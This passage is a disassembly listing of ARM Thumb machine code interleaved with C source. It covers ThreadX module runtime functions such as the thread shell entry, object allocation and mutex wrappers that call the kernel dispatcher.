 8020ad8:	4610      	mov	r0, r2
 8020ada:	4798      	blx	r3

                break;
 8020adc:	e009      	b.n	8020af2 <_txm_module_callback_request_thread_entry+0xae>

            case TXM_THREAD_ENTRY_EXIT_CALLBACK:

                /* Setup thread entry/exit callback pointer.  */
                thread_entry_exit_notify =  (void (*)(TX_THREAD *, UINT)) callback_message.txm_module_callback_message_application_function;
 8020ade:	697b      	ldr	r3, [r7, #20]
 8020ae0:	653b      	str	r3, [r7, #80]	; 0x50

                /* Call thread entry/exit notify callback.  */
                (thread_entry_exit_notify)((TX_THREAD *) callback_message.txm_module_callback_message_param_1, (UINT) callback_message.txm_module_callback_message_param_2);
 8020ae2:	69bb      	ldr	r3, [r7, #24]
 8020ae4:	4618      	mov	r0, r3
 8020ae6:	69fa      	ldr	r2, [r7, #28]
 8020ae8:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 8020aea:	4611      	mov	r1, r2
 8020aec:	4798      	blx	r3

                break;
 8020aee:	e000      	b.n	8020af2 <_txm_module_callback_request_thread_entry+0xae>
                    /* Call the USBX callback function.  */
                    _txm_module_usbx_callback_request(&callback_message);
                }
#endif

                break;
 8020af0:	bf00      	nop
        while (activation_count)
 8020af2:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 8020af4:	2b00      	cmp	r3, #0
 8020af6:	d1be      	bne.n	8020a76 <_txm_module_callback_request_thread_entry+0x32>
        status =  _txe_queue_receive(request_queue, (VOID *) &callback_message, TX_WAIT_FOREVER);
 8020af8:	e7ae      	b.n	8020a58 <_txm_module_callback_request_thread_entry+0x14>
            break;
 8020afa:	bf00      	nop
            }
        }
    }
}
 8020afc:	bf00      	nop
 8020afe:	3760      	adds	r7, #96	; 0x60
 8020b00:	46bd      	mov	sp, r7
 8020b02:	bd80      	pop	{r7, pc}
 8020b04:	00000010 	.word	0x00000010

08020b08 <_txm_module_object_allocate>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txm_module_object_allocate(VOID **object_ptr, ULONG object_size)
{
 8020b08:	b590      	push	{r4, r7, lr}
 8020b0a:	b085      	sub	sp, #20
 8020b0c:	af00      	add	r7, sp, #0
 8020b0e:	6078      	str	r0, [r7, #4]
 8020b10:	6039      	str	r1, [r7, #0]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_MODULE_OBJECT_ALLOCATE_CALL, (ALIGN_TYPE) object_ptr, (ALIGN_TYPE) object_size, 0);
 8020b12:	4b07      	ldr	r3, [pc, #28]	; (8020b30 <_txm_module_object_allocate+0x28>)
 8020b14:	f859 3003 	ldr.w	r3, [r9, r3]
 8020b18:	681c      	ldr	r4, [r3, #0]
 8020b1a:	6879      	ldr	r1, [r7, #4]
 8020b1c:	2300      	movs	r3, #0
 8020b1e:	683a      	ldr	r2, [r7, #0]
 8020b20:	205f      	movs	r0, #95	; 0x5f
 8020b22:	47a0      	blx	r4
 8020b24:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020b26:	68fb      	ldr	r3, [r7, #12]
}
 8020b28:	4618      	mov	r0, r3
 8020b2a:	3714      	adds	r7, #20
 8020b2c:	46bd      	mov	sp, r7
 8020b2e:	bd90      	pop	{r4, r7, pc}
 8020b30:	00000004 	.word	0x00000004

08020b34 <_txm_module_object_deallocate>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txm_module_object_deallocate(VOID *object_ptr)
{
 8020b34:	b590      	push	{r4, r7, lr}
 8020b36:	b085      	sub	sp, #20
 8020b38:	af00      	add	r7, sp, #0
 8020b3a:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_MODULE_OBJECT_DEALLOCATE_CALL, (ALIGN_TYPE) object_ptr, 0, 0);
 8020b3c:	4b07      	ldr	r3, [pc, #28]	; (8020b5c <_txm_module_object_deallocate+0x28>)
 8020b3e:	f859 3003 	ldr.w	r3, [r9, r3]
 8020b42:	681c      	ldr	r4, [r3, #0]
 8020b44:	6879      	ldr	r1, [r7, #4]
 8020b46:	2300      	movs	r3, #0
 8020b48:	2200      	movs	r2, #0
 8020b4a:	2060      	movs	r0, #96	; 0x60
 8020b4c:	47a0      	blx	r4
 8020b4e:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020b50:	68fb      	ldr	r3, [r7, #12]
}
 8020b52:	4618      	mov	r0, r3
 8020b54:	3714      	adds	r7, #20
 8020b56:	46bd      	mov	sp, r7
 8020b58:	bd90      	pop	{r4, r7, pc}
 8020b5a:	bf00      	nop
 8020b5c:	00000004 	.word	0x00000004

08020b60 <_txm_module_object_pointer_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txm_module_object_pointer_get(UINT object_type, CHAR *name, VOID **object_ptr)
{
 8020b60:	b590      	push	{r4, r7, lr}
 8020b62:	b087      	sub	sp, #28
 8020b64:	af00      	add	r7, sp, #0
 8020b66:	60f8      	str	r0, [r7, #12]
 8020b68:	60b9      	str	r1, [r7, #8]
 8020b6a:	607a      	str	r2, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_MODULE_OBJECT_POINTER_GET_CALL, (ALIGN_TYPE) object_type, (ALIGN_TYPE) name, (ALIGN_TYPE) object_ptr);
 8020b6c:	4b07      	ldr	r3, [pc, #28]	; (8020b8c <_txm_module_object_pointer_get+0x2c>)
 8020b6e:	f859 3003 	ldr.w	r3, [r9, r3]
 8020b72:	681c      	ldr	r4, [r3, #0]
 8020b74:	68ba      	ldr	r2, [r7, #8]
 8020b76:	687b      	ldr	r3, [r7, #4]
 8020b78:	68f9      	ldr	r1, [r7, #12]
 8020b7a:	205d      	movs	r0, #93	; 0x5d
 8020b7c:	47a0      	blx	r4
 8020b7e:	6178      	str	r0, [r7, #20]

    /* Return value to the caller.  */
    return(return_value);
 8020b80:	697b      	ldr	r3, [r7, #20]
}
 8020b82:	4618      	mov	r0, r3
 8020b84:	371c      	adds	r7, #28
 8020b86:	46bd      	mov	sp, r7
 8020b88:	bd90      	pop	{r4, r7, pc}
 8020b8a:	bf00      	nop
 8020b8c:	00000004 	.word	0x00000004

08020b90 <_txm_module_object_pointer_get_extended>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txm_module_object_pointer_get_extended(UINT object_type, CHAR *name, UINT name_length, VOID **object_ptr)
{
 8020b90:	b590      	push	{r4, r7, lr}
 8020b92:	b089      	sub	sp, #36	; 0x24
 8020b94:	af00      	add	r7, sp, #0
 8020b96:	60f8      	str	r0, [r7, #12]
 8020b98:	60b9      	str	r1, [r7, #8]
 8020b9a:	607a      	str	r2, [r7, #4]
 8020b9c:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[2];

    extra_parameters[0] = (ALIGN_TYPE) name_length;
 8020b9e:	687b      	ldr	r3, [r7, #4]
 8020ba0:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) object_ptr;
 8020ba2:	683b      	ldr	r3, [r7, #0]
 8020ba4:	61bb      	str	r3, [r7, #24]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_MODULE_OBJECT_POINTER_GET_EXTENDED_CALL, (ALIGN_TYPE) object_type, (ALIGN_TYPE) name, (ALIGN_TYPE) extra_parameters);
 8020ba6:	4b08      	ldr	r3, [pc, #32]	; (8020bc8 <_txm_module_object_pointer_get_extended+0x38>)
 8020ba8:	f859 3003 	ldr.w	r3, [r9, r3]
 8020bac:	681c      	ldr	r4, [r3, #0]
 8020bae:	68ba      	ldr	r2, [r7, #8]
 8020bb0:	f107 0314 	add.w	r3, r7, #20
 8020bb4:	68f9      	ldr	r1, [r7, #12]
 8020bb6:	205e      	movs	r0, #94	; 0x5e
 8020bb8:	47a0      	blx	r4
 8020bba:	61f8      	str	r0, [r7, #28]

    /* Return value to the caller.  */
    return(return_value);
 8020bbc:	69fb      	ldr	r3, [r7, #28]
}
 8020bbe:	4618      	mov	r0, r3
 8020bc0:	3724      	adds	r7, #36	; 0x24
 8020bc2:	46bd      	mov	sp, r7
 8020bc4:	bd90      	pop	{r4, r7, pc}
 8020bc6:	bf00      	nop
 8020bc8:	00000004 	.word	0x00000004

08020bcc <_txm_module_thread_shell_entry>:
/*                                                                        */
/*  10-15-2021      Scott Larson            Initial Version 6.1.9         */
/*                                                                        */
/**************************************************************************/
VOID  _txm_module_thread_shell_entry(TX_THREAD *thread_ptr, TXM_MODULE_THREAD_ENTRY_INFO *thread_info)
{
 8020bcc:	b580      	push	{r7, lr}
 8020bce:	b084      	sub	sp, #16
 8020bd0:	af00      	add	r7, sp, #0
 8020bd2:	6078      	str	r0, [r7, #4]
 8020bd4:	6039      	str	r1, [r7, #0]
#endif


    /* Determine if this is the start thread.  If so, we must prepare the module for
       execution.  If not, simply skip the C startup code.  */
    if (thread_info -> txm_module_thread_entry_info_start_thread)
 8020bd6:	683b      	ldr	r3, [r7, #0]
 8020bd8:	69db      	ldr	r3, [r3, #28]
 8020bda:	2b00      	cmp	r3, #0
 8020bdc:	d01b      	beq.n	8020c16 <_txm_module_thread_shell_entry+0x4a>
    {
        /* Initialize the C environment.  */
        _gcc_setup(thread_info -> txm_module_thread_entry_info_code_base_address);
 8020bde:	683b      	ldr	r3, [r7, #0]
 8020be0:	68db      	ldr	r3, [r3, #12]
 8020be2:	4618      	mov	r0, r3
 8020be4:	f7ff fa64 	bl	80200b0 <_gcc_setup>
        
        /* Save the entry info pointer, for later use.  */
        _txm_module_entry_info =  thread_info;
 8020be8:	4b1b      	ldr	r3, [pc, #108]	; (8020c58 <_txm_module_thread_shell_entry+0x8c>)
 8020bea:	f859 3003 	ldr.w	r3, [r9, r3]
 8020bee:	683a      	ldr	r2, [r7, #0]
 8020bf0:	601a      	str	r2, [r3, #0]
        
        /* Save the kernel function dispatch address. This is used to make all resident calls from
           the module.  */
        _txm_module_kernel_call_dispatcher =  thread_info -> txm_module_thread_entry_info_kernel_call_dispatcher;
 8020bf2:	683b      	ldr	r3, [r7, #0]
 8020bf4:	6ada      	ldr	r2, [r3, #44]	; 0x2c
 8020bf6:	4b19      	ldr	r3, [pc, #100]	; (8020c5c <_txm_module_thread_shell_entry+0x90>)
 8020bf8:	f859 3003 	ldr.w	r3, [r9, r3]
 8020bfc:	601a      	str	r2, [r3, #0]
        
        /* Ensure that we have a valid pointer.  */
        while (!_txm_module_kernel_call_dispatcher)
 8020bfe:	bf00      	nop
 8020c00:	4b16      	ldr	r3, [pc, #88]	; (8020c5c <_txm_module_thread_shell_entry+0x90>)
 8020c02:	f859 3003 	ldr.w	r3, [r9, r3]
 8020c06:	681b      	ldr	r3, [r3, #0]
 8020c08:	2b00      	cmp	r3, #0
 8020c0a:	d0f9      	beq.n	8020c00 <_txm_module_thread_shell_entry+0x34>
               An error here typically indicates the resident portion of _tx_thread_schedule
               is not supporting the trap to obtain the function pointer.   */
        }
        
        /* Resume the module's callback thread, already created in the manager.  */
        _txe_thread_resume(thread_info -> txm_module_thread_entry_info_callback_request_thread);
 8020c0c:	683b      	ldr	r3, [r7, #0]
 8020c0e:	6a1b      	ldr	r3, [r3, #32]
 8020c10:	4618      	mov	r0, r3
 8020c12:	f000 fca3 	bl	802155c <_txe_thread_resume>
    }

#ifndef TX_DISABLE_NOTIFY_CALLBACKS

    /* Pickup the entry/exit application callback routine.  */
    entry_exit_notify =  thread_info -> txm_module_thread_entry_info_exit_notify;
 8020c16:	683b      	ldr	r3, [r7, #0]
 8020c18:	699b      	ldr	r3, [r3, #24]
 8020c1a:	60fb      	str	r3, [r7, #12]

    /* Determine if an application callback routine is specified.  */
    if (entry_exit_notify != TX_NULL)
 8020c1c:	68fb      	ldr	r3, [r7, #12]
 8020c1e:	2b00      	cmp	r3, #0
 8020c20:	d003      	beq.n	8020c2a <_txm_module_thread_shell_entry+0x5e>
    {

        /* Yes, notify application that this thread has been entered!  */
        (entry_exit_notify)(thread_ptr, TX_THREAD_ENTRY);
 8020c22:	68fb      	ldr	r3, [r7, #12]
 8020c24:	2100      	movs	r1, #0
 8020c26:	6878      	ldr	r0, [r7, #4]
 8020c28:	4798      	blx	r3
    }
#endif

    /* Call current thread's entry function.  */
    (thread_info -> txm_module_thread_entry_info_entry) (thread_info -> txm_module_thread_entry_info_parameter);
 8020c2a:	683b      	ldr	r3, [r7, #0]
 8020c2c:	691b      	ldr	r3, [r3, #16]
 8020c2e:	683a      	ldr	r2, [r7, #0]
 8020c30:	6952      	ldr	r2, [r2, #20]
 8020c32:	4610      	mov	r0, r2
 8020c34:	4798      	blx	r3


#ifndef TX_DISABLE_NOTIFY_CALLBACKS

    /* Pickup the entry/exit application callback routine again.  */
    entry_exit_notify =  thread_info -> txm_module_thread_entry_info_exit_notify;
 8020c36:	683b      	ldr	r3, [r7, #0]
 8020c38:	699b      	ldr	r3, [r3, #24]
 8020c3a:	60fb      	str	r3, [r7, #12]

    /* Determine if an application callback routine is specified.  */
    if (entry_exit_notify != TX_NULL)
 8020c3c:	68fb      	ldr	r3, [r7, #12]
 8020c3e:	2b00      	cmp	r3, #0
 8020c40:	d003      	beq.n	8020c4a <_txm_module_thread_shell_entry+0x7e>
    {

        /* Yes, notify application that this thread has exited!  */
        (entry_exit_notify)(thread_ptr, TX_THREAD_EXIT);
 8020c42:	68fb      	ldr	r3, [r7, #12]
 8020c44:	2101      	movs	r1, #1
 8020c46:	6878      	ldr	r0, [r7, #4]
 8020c48:	4798      	blx	r3
    }
#endif

    /* Call actual thread suspension routine.  */
    _txm_module_thread_system_suspend(thread_ptr);
 8020c4a:	6878      	ldr	r0, [r7, #4]
 8020c4c:	f000 f808 	bl	8020c60 <_txm_module_thread_system_suspend>
#ifdef TX_SAFETY_CRITICAL

    /* If we ever get here, raise safety critical exception.  */
    TX_SAFETY_CRITICAL_EXCEPTION(__FILE__, __LINE__, 0);
#endif
}
 8020c50:	bf00      	nop
 8020c52:	3710      	adds	r7, #16
 8020c54:	46bd      	mov	sp, r7
 8020c56:	bd80      	pop	{r7, pc}
 8020c58:	00000010 	.word	0x00000010
 8020c5c:	00000004 	.word	0x00000004

08020c60 <_txm_module_thread_system_suspend>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txm_module_thread_system_suspend(TX_THREAD *thread_ptr)
{
 8020c60:	b590      	push	{r4, r7, lr}
 8020c62:	b085      	sub	sp, #20
 8020c64:	af00      	add	r7, sp, #0
 8020c66:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_SYSTEM_SUSPEND_CALL, (ALIGN_TYPE) thread_ptr, 0, 0);
 8020c68:	4b07      	ldr	r3, [pc, #28]	; (8020c88 <_txm_module_thread_system_suspend+0x28>)
 8020c6a:	f859 3003 	ldr.w	r3, [r9, r3]
 8020c6e:	681c      	ldr	r4, [r3, #0]
 8020c70:	6879      	ldr	r1, [r7, #4]
 8020c72:	2300      	movs	r3, #0
 8020c74:	2200      	movs	r2, #0
 8020c76:	205c      	movs	r0, #92	; 0x5c
 8020c78:	47a0      	blx	r4
 8020c7a:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020c7c:	68fb      	ldr	r3, [r7, #12]
}
 8020c7e:	4618      	mov	r0, r3
 8020c80:	3714      	adds	r7, #20
 8020c82:	46bd      	mov	sp, r7
 8020c84:	bd90      	pop	{r4, r7, pc}
 8020c86:	bf00      	nop
 8020c88:	00000004 	.word	0x00000004

08020c8c <_txe_mutex_create>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_mutex_create(TX_MUTEX *mutex_ptr, CHAR *name_ptr, UINT inherit, UINT mutex_control_block_size)
{
 8020c8c:	b590      	push	{r4, r7, lr}
 8020c8e:	b089      	sub	sp, #36	; 0x24
 8020c90:	af00      	add	r7, sp, #0
 8020c92:	60f8      	str	r0, [r7, #12]
 8020c94:	60b9      	str	r1, [r7, #8]
 8020c96:	607a      	str	r2, [r7, #4]
 8020c98:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[2];

    extra_parameters[0] = (ALIGN_TYPE) inherit;
 8020c9a:	687b      	ldr	r3, [r7, #4]
 8020c9c:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) mutex_control_block_size;
 8020c9e:	683b      	ldr	r3, [r7, #0]
 8020ca0:	61bb      	str	r3, [r7, #24]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_MUTEX_CREATE_CALL, (ALIGN_TYPE) mutex_ptr, (ALIGN_TYPE) name_ptr, (ALIGN_TYPE) extra_parameters);
 8020ca2:	4b08      	ldr	r3, [pc, #32]	; (8020cc4 <_txe_mutex_create+0x38>)
 8020ca4:	f859 3003 	ldr.w	r3, [r9, r3]
 8020ca8:	681c      	ldr	r4, [r3, #0]
 8020caa:	68f9      	ldr	r1, [r7, #12]
 8020cac:	68ba      	ldr	r2, [r7, #8]
 8020cae:	f107 0314 	add.w	r3, r7, #20
 8020cb2:	201a      	movs	r0, #26
 8020cb4:	47a0      	blx	r4
 8020cb6:	61f8      	str	r0, [r7, #28]

    /* Return value to the caller.  */
    return(return_value);
 8020cb8:	69fb      	ldr	r3, [r7, #28]
}
 8020cba:	4618      	mov	r0, r3
 8020cbc:	3724      	adds	r7, #36	; 0x24
 8020cbe:	46bd      	mov	sp, r7
 8020cc0:	bd90      	pop	{r4, r7, pc}
 8020cc2:	bf00      	nop
 8020cc4:	00000004 	.word	0x00000004

08020cc8 <_txe_mutex_delete>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_mutex_delete(TX_MUTEX *mutex_ptr)
{
 8020cc8:	b590      	push	{r4, r7, lr}
 8020cca:	b085      	sub	sp, #20
 8020ccc:	af00      	add	r7, sp, #0
 8020cce:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_MUTEX_DELETE_CALL, (ALIGN_TYPE) mutex_ptr, 0, 0);
 8020cd0:	4b07      	ldr	r3, [pc, #28]	; (8020cf0 <_txe_mutex_delete+0x28>)
 8020cd2:	f859 3003 	ldr.w	r3, [r9, r3]
 8020cd6:	681c      	ldr	r4, [r3, #0]
 8020cd8:	6879      	ldr	r1, [r7, #4]
 8020cda:	2300      	movs	r3, #0
 8020cdc:	2200      	movs	r2, #0
 8020cde:	201b      	movs	r0, #27
 8020ce0:	47a0      	blx	r4
 8020ce2:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020ce4:	68fb      	ldr	r3, [r7, #12]
}
 8020ce6:	4618      	mov	r0, r3
 8020ce8:	3714      	adds	r7, #20
 8020cea:	46bd      	mov	sp, r7
 8020cec:	bd90      	pop	{r4, r7, pc}
 8020cee:	bf00      	nop
 8020cf0:	00000004 	.word	0x00000004

08020cf4 <_txe_mutex_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_mutex_get(TX_MUTEX *mutex_ptr, ULONG wait_option)
{
 8020cf4:	b590      	push	{r4, r7, lr}
 8020cf6:	b085      	sub	sp, #20
 8020cf8:	af00      	add	r7, sp, #0
 8020cfa:	6078      	str	r0, [r7, #4]
 8020cfc:	6039      	str	r1, [r7, #0]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_MUTEX_GET_CALL, (ALIGN_TYPE) mutex_ptr, (ALIGN_TYPE) wait_option, 0);
 8020cfe:	4b07      	ldr	r3, [pc, #28]	; (8020d1c <_txe_mutex_get+0x28>)
 8020d00:	f859 3003 	ldr.w	r3, [r9, r3]
 8020d04:	681c      	ldr	r4, [r3, #0]
 8020d06:	6879      	ldr	r1, [r7, #4]
 8020d08:	2300      	movs	r3, #0
 8020d0a:	683a      	ldr	r2, [r7, #0]
 8020d0c:	201c      	movs	r0, #28
 8020d0e:	47a0      	blx	r4
 8020d10:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020d12:	68fb      	ldr	r3, [r7, #12]
}
 8020d14:	4618      	mov	r0, r3
 8020d16:	3714      	adds	r7, #20
 8020d18:	46bd      	mov	sp, r7
 8020d1a:	bd90      	pop	{r4, r7, pc}
 8020d1c:	00000004 	.word	0x00000004

08020d20 <_txe_mutex_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_mutex_info_get(TX_MUTEX *mutex_ptr, CHAR **name, ULONG *count, TX_THREAD **owner, TX_THREAD **first_suspended, ULONG *suspended_count, TX_MUTEX **next_mutex)
{
 8020d20:	b590      	push	{r4, r7, lr}
 8020d22:	b08b      	sub	sp, #44	; 0x2c
 8020d24:	af00      	add	r7, sp, #0
 8020d26:	60f8      	str	r0, [r7, #12]
 8020d28:	60b9      	str	r1, [r7, #8]
 8020d2a:	607a      	str	r2, [r7, #4]
 8020d2c:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[5];

    extra_parameters[0] = (ALIGN_TYPE) count;
 8020d2e:	687b      	ldr	r3, [r7, #4]
 8020d30:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) owner;
 8020d32:	683b      	ldr	r3, [r7, #0]
 8020d34:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) first_suspended;
 8020d36:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8020d38:	61bb      	str	r3, [r7, #24]
    extra_parameters[3] = (ALIGN_TYPE) suspended_count;
 8020d3a:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8020d3c:	61fb      	str	r3, [r7, #28]
    extra_parameters[4] = (ALIGN_TYPE) next_mutex;
 8020d3e:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 8020d40:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_MUTEX_INFO_GET_CALL, (ALIGN_TYPE) mutex_ptr, (ALIGN_TYPE) name, (ALIGN_TYPE) extra_parameters);
 8020d42:	4b08      	ldr	r3, [pc, #32]	; (8020d64 <_txe_mutex_info_get+0x44>)
 8020d44:	f859 3003 	ldr.w	r3, [r9, r3]
 8020d48:	681c      	ldr	r4, [r3, #0]
 8020d4a:	68f9      	ldr	r1, [r7, #12]
 8020d4c:	68ba      	ldr	r2, [r7, #8]
 8020d4e:	f107 0310 	add.w	r3, r7, #16
 8020d52:	201d      	movs	r0, #29
 8020d54:	47a0      	blx	r4
 8020d56:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 8020d58:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 8020d5a:	4618      	mov	r0, r3
 8020d5c:	372c      	adds	r7, #44	; 0x2c
 8020d5e:	46bd      	mov	sp, r7
 8020d60:	bd90      	pop	{r4, r7, pc}
 8020d62:	bf00      	nop
 8020d64:	00000004 	.word	0x00000004

08020d68 <_tx_mutex_performance_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_mutex_performance_info_get(TX_MUTEX *mutex_ptr, ULONG *puts, ULONG *gets, ULONG *suspensions, ULONG *timeouts, ULONG *inversions, ULONG *inheritances)
{
 8020d68:	b590      	push	{r4, r7, lr}
 8020d6a:	b08b      	sub	sp, #44	; 0x2c
 8020d6c:	af00      	add	r7, sp, #0
 8020d6e:	60f8      	str	r0, [r7, #12]
 8020d70:	60b9      	str	r1, [r7, #8]
 8020d72:	607a      	str	r2, [r7, #4]
 8020d74:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[5];

    extra_parameters[0] = (ALIGN_TYPE) gets;
 8020d76:	687b      	ldr	r3, [r7, #4]
 8020d78:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) suspensions;
 8020d7a:	683b      	ldr	r3, [r7, #0]
 8020d7c:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) timeouts;
 8020d7e:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8020d80:	61bb      	str	r3, [r7, #24]
    extra_parameters[3] = (ALIGN_TYPE) inversions;
 8020d82:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8020d84:	61fb      	str	r3, [r7, #28]
    extra_parameters[4] = (ALIGN_TYPE) inheritances;
 8020d86:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 8020d88:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_MUTEX_PERFORMANCE_INFO_GET_CALL, (ALIGN_TYPE) mutex_ptr, (ALIGN_TYPE) puts, (ALIGN_TYPE) extra_parameters);
 8020d8a:	4b08      	ldr	r3, [pc, #32]	; (8020dac <_tx_mutex_performance_info_get+0x44>)
 8020d8c:	f859 3003 	ldr.w	r3, [r9, r3]
 8020d90:	681c      	ldr	r4, [r3, #0]
 8020d92:	68f9      	ldr	r1, [r7, #12]
 8020d94:	68ba      	ldr	r2, [r7, #8]
 8020d96:	f107 0310 	add.w	r3, r7, #16
 8020d9a:	201e      	movs	r0, #30
 8020d9c:	47a0      	blx	r4
 8020d9e:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 8020da0:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 8020da2:	4618      	mov	r0, r3
 8020da4:	372c      	adds	r7, #44	; 0x2c
 8020da6:	46bd      	mov	sp, r7
 8020da8:	bd90      	pop	{r4, r7, pc}
 8020daa:	bf00      	nop
 8020dac:	00000004 	.word	0x00000004

08020db0 <_tx_mutex_performance_system_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_mutex_performance_system_info_get(ULONG *puts, ULONG *gets, ULONG *suspensions, ULONG *timeouts, ULONG *inversions, ULONG *inheritances)
{
 8020db0:	b590      	push	{r4, r7, lr}
 8020db2:	b08b      	sub	sp, #44	; 0x2c
 8020db4:	af00      	add	r7, sp, #0
 8020db6:	60f8      	str	r0, [r7, #12]
 8020db8:	60b9      	str	r1, [r7, #8]
 8020dba:	607a      	str	r2, [r7, #4]
 8020dbc:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[4];

    extra_parameters[0] = (ALIGN_TYPE) suspensions;
 8020dbe:	687b      	ldr	r3, [r7, #4]
 8020dc0:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) timeouts;
 8020dc2:	683b      	ldr	r3, [r7, #0]
 8020dc4:	61bb      	str	r3, [r7, #24]
    extra_parameters[2] = (ALIGN_TYPE) inversions;
 8020dc6:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8020dc8:	61fb      	str	r3, [r7, #28]
    extra_parameters[3] = (ALIGN_TYPE) inheritances;
 8020dca:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8020dcc:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_MUTEX_PERFORMANCE_SYSTEM_INFO_GET_CALL, (ALIGN_TYPE) puts, (ALIGN_TYPE) gets, (ALIGN_TYPE) extra_parameters);
 8020dce:	4b08      	ldr	r3, [pc, #32]	; (8020df0 <_tx_mutex_performance_system_info_get+0x40>)
 8020dd0:	f859 3003 	ldr.w	r3, [r9, r3]
 8020dd4:	681c      	ldr	r4, [r3, #0]
 8020dd6:	68f9      	ldr	r1, [r7, #12]
 8020dd8:	68ba      	ldr	r2, [r7, #8]
 8020dda:	f107 0314 	add.w	r3, r7, #20
 8020dde:	201f      	movs	r0, #31
 8020de0:	47a0      	blx	r4
 8020de2:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 8020de4:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 8020de6:	4618      	mov	r0, r3
 8020de8:	372c      	adds	r7, #44	; 0x2c
 8020dea:	46bd      	mov	sp, r7
 8020dec:	bd90      	pop	{r4, r7, pc}
 8020dee:	bf00      	nop
 8020df0:	00000004 	.word	0x00000004

08020df4 <_txe_mutex_prioritize>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_mutex_prioritize(TX_MUTEX *mutex_ptr)
{
 8020df4:	b590      	push	{r4, r7, lr}
 8020df6:	b085      	sub	sp, #20
 8020df8:	af00      	add	r7, sp, #0
 8020dfa:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
